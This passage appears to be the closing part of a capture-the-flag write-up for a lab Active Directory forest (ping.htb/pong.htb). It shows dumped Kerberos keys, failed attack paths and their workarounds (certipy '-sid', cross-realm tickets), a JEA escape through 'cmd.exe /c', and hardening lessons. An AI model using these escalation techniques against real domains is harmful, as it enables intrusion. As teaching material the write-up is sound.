pong$:aes128-cts-hmac-sha1-96:e83cb1978f5334573b74e78ef5dea60f
pong$:des-cbc-md5:040b2f542c0eabda
[*] Cleaning up...
```


# What Blocked Us

Several attack paths that look obvious at first glance turned out to be dead ends because of specific defensive configurations. Documenting them helps explain why the final chain takes the route it does.

### Shadow Credentials on svc_sql (blocked by broken LDAPS)

The natural attack on a service account with `GenericWrite` is to abuse `msDS-KeyCredentialLink` via `pywhisker` or `certipy shadow`. Both rely on LDAPS for the write operation since `msDS-KeyCredentialLink` modifications require encrypted transport. On `dc2.pong.htb`, LDAPS responds but the SSL handshake fails (`SSL: NO_CIPHERS_AVAILABLE`), making Shadow Credentials impossible. This is why the chain pivots to RBCD instead, which can be configured through plain LDAP.

### BloodyAD direct on dc2 (cross-realm Kerberos issues)

Initial attempts to run `bloodyAD` against `dc2.pong.htb` with a `c.roberts@ping.htb` ticket fail with `invalidCredentials (SEC_E_LOGON_DENIED)`. The reason is that bloodyAD's Kerberos library doesn't follow cross-realm referrals automatically: it tries to authenticate against `dc2` with a TGT that targets `ping.htb` only. The fix is to manually request the cross-realm TGT (`krbtgt/pong.htb@PING.HTB`) and a service ticket (`ldap/dc2.pong.htb`), then merge them into a single ccache.

### Certipy req without `-sid` (CVE-2022-26923 mitigation)

Even after granting Enroll rights and configuring the template, `certipy req` returned an error indicating the certificate had no object SID. This is the CVE-2022-26923 (Certifried) mitigation: Microsoft now embeds the requester's SID in the certificate as a Security Extension, and the KDC rejects authentication when the SID doesn't match. The fix is to manually pass `-sid <Administrator_SID>` so certipy embeds the correct value, allowing the Kerberos PKINIT authentication to succeed.

### Certipy without `-dc-host dc2.pong.htb` (RPC cross-realm bug)

Pointing `-dc-host` at `dc1.ping.htb` (the actual target CA host) consistently fails with `Failed to get DCE RPC connection` because impacket's RPC binding doesn't handle cross-realm service tickets cleanly. Pointing `-dc-host` at `dc2.pong.htb` (our user's home KDC) lets impacket request a referral ticket the way it's designed to, and the RPC call to `dc1.ping.htb` succeeds. This is a known impacket limitation rather than a Certipy bug.

# Lessons Learned

This box demonstrates several common Active Directory hardening attempts that fail to provide actual security when other configurations are weak. Each defensive measure here was bypassed by exploiting a different misconfiguration:

- **NTLM disabled forest-wide, but Kerberos cross-forest poorly configured.**
  Disabling NTLM is a strong hardening measure, but the forest trust between `ping.htb` and `pong.htb` was bidirectional with no SID filtering, allowing principals from one forest to gain rights in the other.
- **LDAP signing required, but LDAPS broken on dc2.**
  The combination of "LDAP signing required" + a broken LDAPS endpoint on `dc2.pong.htb` left only unsigned LDAP open for write operations through `bloodyAD`. This is a contradictory configuration that creates more attack surface than it removes.
- **Bidirectional Forest Trust without SID Filtering.**
  Foreign Security Principals from `ping.htb` could be added to `pong.htb` groups (after flipping the group scope), and ACLs from `pong.htb` (CA Managers) granted privileges over `ping.htb` resources. Enabling SID Filtering on the trust would have prevented the cross-forest privilege escalation.
- **AD CS template with inherited WriteProperty on a single template.**
  Only `SmartcardAuthentication` was writable due to an inherited ACE, while other templates were properly locked down. This kind of inconsistent hardening is exactly what an attacker looks for: one forgotten template is enough to chain ESC4 → ESC1.
- **Credentials in clear-text in PSReadLine history.**
  The `Pong_gMSA$` account had a `ConsoleHost_history.txt` containing plain-text credentials for `c.carlssen`. PSReadLine history is enabled by default and is rarely audited, but it leaks operator activity. Disabling history for service accounts (or redirecting it to a read-only location) would have killed this vector.
- **GMSA accessible cross-forest via group scope manipulation.**
  The `gMSA Managers` group was set as Global, which prevents cross-forest membership. But because `c.roberts` had `Owns` rights on the group through `IT@PING.HTB`, the scope could be flipped to DomainLocal and a Foreign Security Principal added. Reviewing ownership of sensitive groups (especially those tied to gMSA password retrieval) would have caught this.
- **JEA endpoint with insufficient command filtering.**
  The `restricted` JEA configuration limited the available cmdlets, but allowed `& { cmd.exe /c ... }` invocation, which fully escapes the constrained PowerShell session. JEA must be configured with `LanguageMode = NoLanguage` and a strict allowlist of functions, never relying on default `RestrictedRemoteServer` alone.
